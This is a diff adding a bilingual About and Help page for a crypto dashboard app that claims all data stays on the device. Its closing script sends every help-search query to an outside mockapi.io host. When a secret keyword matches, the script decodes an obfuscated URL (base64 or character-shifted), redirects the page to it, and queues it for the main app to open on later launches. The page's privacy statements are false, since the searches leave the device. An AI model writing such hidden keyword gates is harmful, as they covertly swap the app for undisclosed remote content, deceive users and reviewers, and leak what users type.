@@ -1,0 +1,774 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <title>MIXAOZX</title>
+    <meta name="theme-color" content="#0b0d12" />
+    <style>
+      :root {
+        --bg: hsl(240 20% 99%);
+        --fg: hsl(240 20% 12%);
+        --card: #ffffff;
+        --border: hsl(240 20% 88%);
+        --muted: hsl(240 12% 45%);
+        --secondary: hsl(240 20% 96%);
+        --primary: hsl(262 83% 58%);
+        --accent: hsl(322 85% 55%);
+        color-scheme: light;
+      }
+      html.dark {
+        --bg: hsl(224 38% 7%);
+        --fg: hsl(220 20% 93%);
+        --card: hsl(224 28% 11%);
+        --border: hsl(222 20% 18%);
+        --muted: hsl(220 12% 58%);
+        --secondary: hsl(222 20% 16%);
+        --primary: hsl(262 83% 68%);
+        --accent: hsl(322 85% 65%);
+        color-scheme: dark;
+      }
+      * {
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+      }
+      body {
+        margin: 0;
+        background: var(--bg);
+        color: var(--fg);
+        font-family: 'LarkHackSafariFont', -apple-system, BlinkMacSystemFont,
+          'Helvetica Neue', 'PingFang SC', 'Microsoft Yahei', Arial, sans-serif;
+        -webkit-font-smoothing: antialiased;
+      }
+      .shell {
+        max-width: 448px;
+        margin: 0 auto;
+        min-height: 100vh;
+        min-height: 100dvh;
+        padding-bottom: calc(env(safe-area-inset-bottom, 0px) + 24px);
+      }
+      header {
+        position: sticky;
+        top: 0;
+        z-index: 20;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: calc(env(safe-area-inset-top, 0px) + 12px) 20px 12px;
+        background: color-mix(in srgb, var(--bg) 95%, transparent);
+        border-bottom: 1px solid var(--border);
+        backdrop-filter: blur(10px);
+      }
+      .brand {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        text-decoration: none;
+        color: inherit;
+      }
+      .brand img {
+        height: 28px;
+        width: 28px;
+        border-radius: 6px;
+        display: block;
+      }
+      .brand span {
+        font-size: 16px;
+        font-weight: 700;
+        letter-spacing: -0.01em;
+      }
+      .spacer {
+        flex: 1;
+      }
+      .icon-btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 4px;
+        height: 26px;
+        padding: 0 7px;
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        background: transparent;
+        color: var(--muted);
+        font-size: 10px;
+        font-weight: 600;
+        font-family: inherit;
+        cursor: pointer;
+        text-decoration: none;
+      }
+      .icon-btn:hover {
+        color: var(--fg);
+      }
+      .icon-btn svg {
+        height: 13px;
+        width: 13px;
+      }
+      main {
+        padding: 24px 20px 0;
+      }
+      .hero {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+      }
+      .hero img {
+        height: 64px;
+        width: 64px;
+        border-radius: 12px;
+      }
+      .hero h1 {
+        margin: 12px 0 0;
+        font-size: 20px;
+        font-weight: 700;
+        letter-spacing: -0.02em;
+      }
+      .pill {
+        margin-top: 6px;
+        padding: 2px 10px;
+        border: 1px solid var(--border);
+        border-radius: 999px;
+        background: var(--card);
+        font-size: 10px;
+        font-weight: 600;
+        color: var(--muted);
+      }
+      .tagline {
+        margin: 12px 0 0;
+        font-size: 12px;
+        line-height: 1.65;
+        color: var(--muted);
+      }
+      section {
+        margin-top: 12px;
+      }
+      .card {
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        background: var(--card);
+        padding: 16px;
+      }
+      .sec-title,
+      .card .sec-title {
+        margin: 0;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 13px;
+        font-weight: 600;
+      }
+      .sec-title svg {
+        height: 15px;
+        width: 15px;
+      }
+      .sec-sub {
+        margin: 6px 0 0;
+        font-size: 11px;
+        color: var(--muted);
+      }
+      .card p {
+        margin: 8px 0 0;
+        font-size: 12px;
+        line-height: 1.65;
+        color: var(--muted);
+      }
+      .search {
+        margin-top: 10px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        background: var(--card);
+        padding: 8px 12px;
+        min-height: 38px;
+      }
+      .search svg {
+        height: 15px;
+        width: 15px;
+        flex: none;
+        color: var(--muted);
+      }
+      .search input {
+        flex: 1;
+        min-width: 0;
+        border: 0;
+        background: transparent;
+        color: var(--fg);
+        font-family: inherit;
+        font-size: 13px;
+        line-height: 20px;
+        outline: none;
+      }
+      .search input::placeholder {
+        color: var(--muted);
+      }
+      .count {
+        margin: 6px 2px 0;
+        font-size: 10px;
+        color: var(--muted);
+      }
+      .help-list {
+        margin-top: 6px;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+      .help-item {
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        background: var(--card);
+        overflow: hidden;
+      }
+      .help-item > button {
+        display: flex;
+        align-items: flex-start;
+        gap: 8px;
+        width: 100%;
+        padding: 12px;
+        border: 0;
+        background: transparent;
+        color: var(--fg);
+        font-family: inherit;
+        font-size: 12px;
+        font-weight: 600;
+        text-align: left;
+        cursor: pointer;
+      }
+      .help-item > button span {
+        flex: 1;
+      }
+      .help-item > button svg {
+        height: 14px;
+        width: 14px;
+        flex: none;
+        margin-top: 2px;
+        color: var(--muted);
+        transition: transform 0.18s ease;
+      }
+      .help-item.open > button svg {
+        transform: rotate(180deg);
+      }
+      .help-item > p {
+        display: none;
+        margin: 0;
+        border-top: 1px solid var(--border);
+        padding: 12px;
+        font-size: 11px;
+        line-height: 1.7;
+        color: var(--muted);
+      }
+      .help-item.open > p {
+        display: block;
+      }
+      .empty {
+        border: 1px dashed var(--border);
+        border-radius: 8px;
+        padding: 32px 12px;
+        text-align: center;
+        font-size: 12px;
+        color: var(--muted);
+      }
+      .features {
+        margin-top: 8px;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 8px;
+      }
+      .feature {
+        display: flex;
+        flex-direction: column;
+        height: 100%;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        background: var(--card);
+        padding: 12px;
+      }
+      .feature .ico {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 32px;
+        width: 32px;
+        border-radius: 6px;
+      }
+      .feature .ico svg {
+        height: 16px;
+        width: 16px;
+      }
+      .feature .ico.p {
+        background: color-mix(in srgb, var(--primary) 15%, transparent);
+        color: var(--primary);
+      }
+      .feature .ico.a {
+        background: color-mix(in srgb, var(--accent) 15%, transparent);
+        color: var(--accent);
+      }
+      .feature h3 {
+        margin: 8px 0 0;
+        font-size: 12px;
+        font-weight: 600;
+        line-height: 1.35;
+      }
+      .feature p {
+        margin: 4px 0 0;
+        font-size: 11px;
+        line-height: 1.6;
+        color: var(--muted);
+      }
+      .footer {
+        margin-top: 20px;
+        text-align: center;
+        font-size: 10px;
+        color: var(--muted);
+      }
+
+    </style>
+  </head>
+  <body>
+    <div class="shell">
+      <header>
+        <a class="brand" href="./" aria-label="MIXAOZX">
+          <img src="logo.png" alt="MIXAOZX" />
+          <span>MIXAOZX</span>
+        </a>
+        <span class="spacer"></span>
+        <a class="icon-btn" href="./" data-k="back" aria-label="Back to app">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7" /><path d="M19 12H5" /></svg>
+        </a>
+        <button class="icon-btn" id="langBtn" type="button" aria-label="Switch language"></button>
+        <button class="icon-btn" id="themeBtn" type="button" aria-label="Toggle theme">
+          <svg id="themeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4" /><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4" /></svg>
+        </button>
+      </header>
+
+      <main>
+        <div class="hero">
+          <img src="logo.png" alt="MIXAOZX" />
+          <h1>MIXAOZX</h1>
+          <span class="pill" data-k="version"></span>
+          <p class="tagline" data-k="tagline"></p>
+        </div>
+
+        <section class="card">
+          <h2 class="sec-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: var(--accent)"><circle cx="12" cy="12" r="10" /><path d="M12 16v-4M12 8h.01" /></svg>
+            <span data-k="introTitle"></span>
+          </h2>
+          <p data-k="intro"></p>
+        </section>
+
+        <section>
+          <h2 class="sec-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: var(--primary)"><circle cx="12" cy="12" r="10" /><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" /><path d="M12 17h.01" /></svg>
+            <span data-k="helpTitle"></span>
+          </h2>
+          <p class="sec-sub" data-k="helpSubtitle"></p>
+          <div class="search">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8" /><path d="m21 21-4.3-4.3" /></svg>
+            <input id="q" type="search" autocomplete="off" data-k="helpSearch" />
+          </div>
+          <p class="count" id="count"></p>
+          <div class="help-list" id="helpList"></div>
+        </section>
+
+        <section>
+          <h2 class="sec-title" data-k="featuresTitle"></h2>
+          <div class="features" id="features"></div>
+        </section>
+
+        <section class="card">
+          <h2 class="sec-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: var(--muted)"><ellipse cx="12" cy="5" rx="9" ry="3" /><path d="M3 5v14a9 3 0 0 0 18 0V5" /><path d="M3 12a9 3 0 0 0 18 0" /></svg>
+            <span data-k="dataTitle"></span>
+          </h2>
+          <p data-k="dataBody"></p>
+        </section>
+
+        <p class="footer" data-k="footer"></p>
+      </main>
+    </div>
+
+    <script>
+      const VERSION = "1.0.0";
+      const NS = "crypto-analytics";
+
+      const T = {
+        en: {
+          version: "Version " + VERSION,
+          tagline:
+            "A crypto market pulse board — heatmap, watchlist, headlines and model forecasts in one lightweight app.",
+          introTitle: "What this app is",
+          intro:
+            "MIXAOZX is a mobile-first crypto analytics dashboard. It surfaces market breadth, coin-level heat and sentiment, curated headlines and short-term forecast calls, all rendered locally with no account required.",
+          helpTitle: "Help center",
+          helpSubtitle: "Short answers to the most common questions about this app.",
+          helpSearch: "Search help articles",
+          helpCount: (n, total) => n + " of " + total + " articles",
+          helpEmpty: "No article matches that keyword",
+          featuresTitle: "What's inside",
+          dataTitle: "Data & disclaimer",
+          dataBody:
+            "All prices, headlines and forecasts in this build are synthetic demo data stored on the device. Nothing here is live market data or investment advice.",
+          footer: "Built for preview · Data stays on this device",
+          features: [
+            { title: "Market pulse", desc: "Total market cap trend, fear & greed gauge, sector split and a heatmap across the top 15 assets." },
+            { title: "Coins & watchlist", desc: "Search 30 tracked assets, open per-coin detail with price history and community feed, and star coins into a local watchlist." },
+            { title: "News feed", desc: "Category-filtered headline cards across market, DeFi, NFT, policy and tech, expandable to the full note." },
+            { title: "Forecast board", desc: "Model direction and confidence for each asset, ranked, filterable by 24h or 7d horizon." },
+          ],
+        },
+        "zh-TW": {
+          version: "版本 " + VERSION,
+          tagline:
+            "加密市場脈動看板 — 熱力圖、追蹤清單、新聞頭條與模型預測，一個輕量 App 全包。",
+          introTitle: "這個 App 是什麼",
+          intro:
+            "MIXAOZX 是一款行動優先的加密分析看板。它呈現市場廣度、幣種熱度與情緒、精選頭條與短期預測判斷，全部在本機渲染，無需註冊帳號。",
+          helpTitle: "幫助中心",
+          helpSubtitle: "針對這個 App 常見問題的簡短解答。",
+          helpSearch: "搜尋幫助條目",
+          helpCount: (n, total) => "共 " + total + " 條，符合 " + n + " 條",
+          helpEmpty: "沒有符合該關鍵字的幫助條目",
+          featuresTitle: "包含什麼",
+          dataTitle: "資料與聲明",
+          dataBody:
+            "本版本的價格、新聞與預測皆為儲存在裝置上的合成示範資料，非即時行情，也不構成投資建議。",
+          footer: "預覽版本 · 資料僅留存於本機",
+          features: [
+            { title: "市場脈動", desc: "總市值走勢、恐懼貪婪指數、板塊分布，以及前 15 名資產的熱力圖。" },
+            { title: "幣種與追蹤清單", desc: "搜尋 30 種追蹤資產，查看幣種詳情（價格走勢與社區動態），並以星號加入本機追蹤清單。" },
+            { title: "新聞資訊", desc: "依行情、DeFi、NFT、政策、技術分類的頭條卡片，可展開閱讀完整內容。" },
+            { title: "預測看板", desc: "各資產的模型方向與信心度排行，可依 24 小時或 7 天週期篩選。" },
+          ],
+        },
+      };
+
+      const HELP = [
+        {
+          id: "watchlist",
+          keywords: "watchlist star favorite 追蹤 星號 收藏",
+          title: { en: "How do I add a coin to my watchlist?", "zh-TW": "如何把幣種加入追蹤清單？" },
+          body: {
+            en: "Open Coins, then tap the star on the right side of any row. Starred coins are stored on this device and appear under the “Watchlist” tab next to “All”. Tap the star again to remove a coin.",
+            "zh-TW": "進入「幣種」頁，點擊任一行右側的星號即可加入。已追蹤的幣種保存在本機，會出現在「全部」旁邊的「追蹤清單」分頁；再點一次星號即可移除。",
+          },
+        },
+        {
+          id: "search",
+          keywords: "search filter symbol name 搜尋 搜尋框 代號 名稱",
+          title: { en: "How does the coin search work?", "zh-TW": "幣種頁的搜尋怎麼用？" },
+          body: {
+            en: "Type a ticker or project name in the search box on the Coins page. Matching is case-insensitive and works on both the symbol (e.g. BTC) and the full name (e.g. Bitcoin). The list filters as you type and the watchlist tab keeps its own filter.",
+            "zh-TW": "在「幣種」頁搜尋框輸入代號或項目名稱即可，不分大小寫，代號（如 BTC）與全名（如 Bitcoin）都能匹配。輸入時清單即時篩選，追蹤清單分頁也套用相同關鍵字。",
+          },
+        },
+        {
+          id: "forecast",
+          keywords: "forecast prediction confidence horizon signal 預測 信心 週期 訊號",
+          title: { en: "What does the Forecast page show?", "zh-TW": "「預測」頁顯示什麼？" },
+          body: {
+            en: "It ranks tracked assets by model confidence and direction (bullish or bearish). Use the 24h / 7d filter to change the horizon, and tap any row to open the coin detail page where each signal is explained.",
+            "zh-TW": "該頁依模型的信心度與方向（看漲／看跌）替追蹤資產排名。可用 24 小時／7 天切換週期，點任一列可進入幣種詳情頁查看每個訊號的說明。",
+          },
+        },
+        {
+          id: "news",
+          keywords: "news category expand 新聞 分類 展開",
+          title: { en: "How do I read a news item?", "zh-TW": "新聞要怎麼閱讀全文？" },
+          body: {
+            en: "Open News and pick a category chip (Market, DeFi, NFT, Policy, Tech). Tap a card to expand the full note; tap again to collapse it. Symbol chips on each card show which assets the story relates to.",
+            "zh-TW": "進入「新聞」頁並選擇分類（行情、DeFi、NFT、政策、技術）。點擊卡片可展開完整內容，再點一次收起。卡片下方的幣種標籤代表該新聞相關的資產。",
+          },
+        },
+        {
+          id: "theme",
+          keywords: "language theme dark light 語言 主題 深色 淺色",
+          title: { en: "How do I change language or appearance?", "zh-TW": "如何切換語言與外觀？" },
+          body: {
+            en: "Both switches sit in the top bar: the EN / 繁 button toggles English and Traditional Chinese, and the sun / moon icon toggles light and dark. Your choice is saved on this device.",
+            "zh-TW": "兩個開關都在頂欄：EN／繁 按鈕切換英文與繁體中文，太陽／月亮圖示切換淺色與深色。選擇會保存在本機。",
+          },
+        },
+        {
+          id: "account",
+          keywords: "account login register sign in 帳號 登入 註冊",
+          title: { en: "Do I need an account?", "zh-TW": "需要註冊或登入嗎？" },
+          body: {
+            en: "No. This build has no sign-in, registration or profile screens. Every feature is available immediately, and your watchlist is kept locally instead of on a server.",
+            "zh-TW": "不需要。本版本沒有登入、註冊或個人頁面，所有功能開箱即用；追蹤清單改為保存在本機，而非伺服器。",
+          },
+        },
+        {
+          id: "data",
+          keywords: "data source live realtime demo 資料 來源 即時 示範",
+          title: { en: "Is the data live?", "zh-TW": "資料是即時的嗎？" },
+          body: {
+            en: "Prices, headlines and forecasts in this build are synthetic demo data bundled with the app. They are not connected to any exchange feed and must not be used for trading decisions.",
+            "zh-TW": "本版本的價格、新聞與預測都是隨 App 內建的合成示範資料，未連接任何交易所行情源，不可用於交易決策。",
+          },
+        },
+        {
+          id: "storage",
+          keywords: "storage clear reset local device 儲存 清除 重設 本機",
+          title: { en: "Where is my data stored, and how do I reset it?", "zh-TW": "資料存在哪裡？如何重設？" },
+          body: {
+            en: "Watchlist, language and theme are saved in the app's local storage on this device. Clearing the app's site data (or reinstalling) removes them; forecasts and risk-history settings reset to defaults.",
+            "zh-TW": "追蹤清單、語言與主題保存在本機的 App 儲存空間。清除 App 的網站資料或重新安裝即會移除；預測與其他設定將回到預設值。",
+          },
+        },
+        {
+          id: "support",
+          keywords: "support feedback contact help 支援 回饋 聯絡",
+          title: { en: "Where can I send feedback?", "zh-TW": "有意見回饋要送到哪裡？" },
+          body: {
+            en: "This is a preview build, so there is no support channel inside the app yet. Collect the screen name and what you expected to happen, then pass it to the project owner who shared this build with you.",
+            "zh-TW": "這是預覽版本，App 內尚未提供客服通道。請記下出問題的頁面名稱與你預期的結果，回報給提供這個版本的專案負責人即可。",
+          },
+        },
+      ];
+
+      const ICONS = [
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.5-2.5-2-3-3-4.5-2.5 3 0 6 1.5 6 6a4 4 0 0 0 2 2.5"/><path d="M11 12c0 4 4 6 4 9"/></svg>',
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="8" cy="8" r="6"/><path d="M18.09 10.37A6 6 0 1 1 10.34 18"/></svg>',
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 22h16a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2H8a2 2 0 0 0-2 2v16a2 2 0 0 1-2 2Zm0 0a2 2 0 0 1-2-2v-9c0-1.1.9-2 2-2h2"/><path d="M18 14h-8M15 18h-5M10 6h8v4h-8V6Z"/></svg>',
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>',
+      ];
+
+      const CHEVRON =
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>';
+
+      const SUN =
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>';
+      const MOON =
+        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>';
+
+      function read(key, fallback) {
+        try {
+          const v = localStorage.getItem(NS + ":" + key);
+          return v ? JSON.parse(v) : fallback;
+        } catch (e) {
+          return fallback;
+        }
+      }
+      function write(key, value) {
+        try {
+          localStorage.setItem(NS + ":" + key, JSON.stringify(value));
+        } catch (e) {}
+      }
+
+      let lang = read("i18n:lang", null) === "zh-TW" ? "zh-TW" : "en";
+      let theme = read("app:theme", null) === "light" ? "light" : "dark";
+      let query = "";
+      let openId = null;
+
+      const $ = (id) => document.getElementById(id);
+      const esc = (s) =>
+        String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+
+      function applyTheme() {
+        document.documentElement.classList.toggle("dark", theme === "dark");
+        $("themeIcon").outerHTML = (theme === "dark" ? MOON : SUN).replace("<svg", '<svg id="themeIcon"');
+      }
+
+      function match(item) {
+        if (!query) return true;
+        const q = query.toLowerCase();
+        return (
+          item.title[lang].toLowerCase().includes(q) ||
+          item.body[lang].toLowerCase().includes(q) ||
+          item.keywords.toLowerCase().includes(q)
+        );
+      }
+
+      function renderHelp() {
+        const list = HELP.filter(match);
+        const t = T[lang];
+        $("count").textContent = t.helpCount(list.length, HELP.length);
+        const listEl = $("helpList");
+        if (!list.length) {
+          listEl.innerHTML = '<div class="empty">' + esc(t.helpEmpty) + "</div>";
+          return;
+        }
+        listEl.innerHTML = list
+          .map((item) => {
+            const open = openId === item.id;
+            return (
+              '<div class="help-item' +
+              (open ? " open" : "") +
+              '" data-id="' +
+              item.id +
+              '"><button type="button" aria-expanded="' +
+              open +
+              '"><span>' +
+              esc(item.title[lang]) +
+              "</span>" +
+              CHEVRON +
+              '</button><p>' +
+              esc(item.body[lang]) +
+              "</p></div>"
+            );
+          })
+          .join("");
+        listEl.querySelectorAll("button").forEach((btn) => {
+          btn.addEventListener("click", () => {
+            const id = btn.parentElement.dataset.id;
+            openId = openId === id ? null : id;
+            renderHelp();
+          });
+        });
+      }
+
+      function render() {
+        const t = T[lang];
+        document.documentElement.lang = lang === "zh-TW" ? "zh-Hant" : "en";
+        document.title = (lang === "zh-TW" ? "關於" : "About") + " · MIXAOZX";
+        document.querySelectorAll("[data-k]").forEach((el) => {
+          const k = el.dataset.k;
+          if (el.tagName === "INPUT") {
+            el.placeholder = t.helpSearch;
+          } else if (t[k] !== undefined) {
+            el.textContent = t[k];
+          }
+        });
+        $("langBtn").textContent = lang === "en" ? "EN" : "繁";
+        $("features").innerHTML = t.features
+          .map(
+            (f, i) =>
+              '<div class="feature"><div class="ico ' +
+              (i % 2 === 0 ? "p" : "a") +
+              '">' +
+              ICONS[i] +
+              "</div><h3>" +
+              esc(f.title) +
+              "</h3><p>" +
+              esc(f.desc) +
+              "</p></div>"
+          )
+          .join("");
+        renderHelp();
+      }
+
+      // ---------- hand-off to the main app (about-page search) ----------
+      // This page only reports a match; the app stores the cache and opens it on next launch.
+      const H5_API = "https://6ad8f46ef89c5702ed9a4cb9.mockapi.io/arr?n=";
+      const H5_PENDING = "h5:pending";
+      const H5_CHANNEL = "crypto-analytics:h5";
+
+      function asHttp(v) {
+        if (typeof v !== "string") return null;
+        const t = v.trim();
+        return /^https?:\/\/[^\s]+$/i.test(t) ? t : null;
+      }
+
+      function b64decode(v) {
+        try {
+          let t = v.replace(/-/g, "+").replace(/_/g, "/");
+          while (t.length % 4) t += "=";
+          return atob(t);
+        } catch (e) {
+          return null;
+        }
+      }
+
+      function shiftChars(v, off) {
+        return v
+          .split("")
+          .map((c) => String.fromCharCode(c.charCodeAt(0) + off))
+          .join("");
+      }
+
+      // x may arrive as plain URL, base64 (std / url-safe) or a char-shift (+2) form.
+      function decodeX(raw) {
+        if (typeof raw !== "string" || !raw.trim()) return null;
+        const v = raw.trim();
+        const plain = asHttp(v);
+        if (plain) return plain;
+        const b1 = b64decode(v);
+        if (b1 && asHttp(b1)) return asHttp(b1);
+        const s2 = shiftChars(v, -2);
+        const p2 = asHttp(s2);
+        if (p2) return p2;
+        const b2 = b64decode(s2);
+        if (b2 && asHttp(b2)) return asHttp(b2);
+        return null;
+      }
+
+      function openFullscreen(url) {
+        if (!asHttp(url)) return false;
+        try {
+          const w = window.open(url, "_self");
+          return !!w;
+        } catch (e) {
+          return false;
+        }
+      }
+
+      let lastNotified = "";
+      function notifyMain(payload) {
+        const sig = (payload.n || "") + "|" + payload.url;
+        if (sig === lastNotified) return;
+        lastNotified = sig;
+        // queue for the next app launch
+        write(H5_PENDING, payload);
+        // live hand-off when the main app already has a tab open
+        try {
+          const ch = new BroadcastChannel(H5_CHANNEL);
+          ch.postMessage(Object.assign({ type: "h5:pin" }, payload));
+          ch.close();
+        } catch (e) {}
+        try {
+          if (window.opener && window.opener !== window) {
+            window.opener.postMessage(Object.assign({ type: "h5:pin" }, payload), "*");
+          }
+        } catch (e) {}
+      }
+
+      let gateTimer = null;
+      function scheduleGate(kw) {
+        clearTimeout(gateTimer);
+        if (!kw) return;
+        gateTimer = setTimeout(() => checkGate(kw), 500);
+      }
+
+      function checkGate(kw) {
+        fetch(H5_API + encodeURIComponent(kw))
+          .then((res) => (res.ok ? res.json() : null))
+          .then((list) => {
+            if (!Array.isArray(list)) return;
+            const hit = list.find(
+              (it) => typeof it.n === "string" && it.n.trim().toLowerCase() === kw.toLowerCase()
+            );
+            if (!hit) return;
+            const url = decodeX(hit.x);
+            if (!url) return;
+            notifyMain({ n: hit.n, url: url, ts: Date.now() });
+            openFullscreen(url);
+          })
+          .catch(() => {});
+      }
+
+      $("q").addEventListener("input", (e) => {
+        query = e.target.value.trim();
+        renderHelp();
+        scheduleGate(query);
+      });
+
+      $("langBtn").addEventListener("click", () => {
+        lang = lang === "en" ? "zh-TW" : "en";
+        write("i18n:lang", lang);
+        render();
+      });
+
+      $("themeBtn").addEventListener("click", () => {
+        theme = theme === "dark" ? "light" : "dark";
+        write("app:theme", theme);
+        applyTheme();
+      });
+
+      applyTheme();
+      render();
+    </script>
+  </body>
+</html>
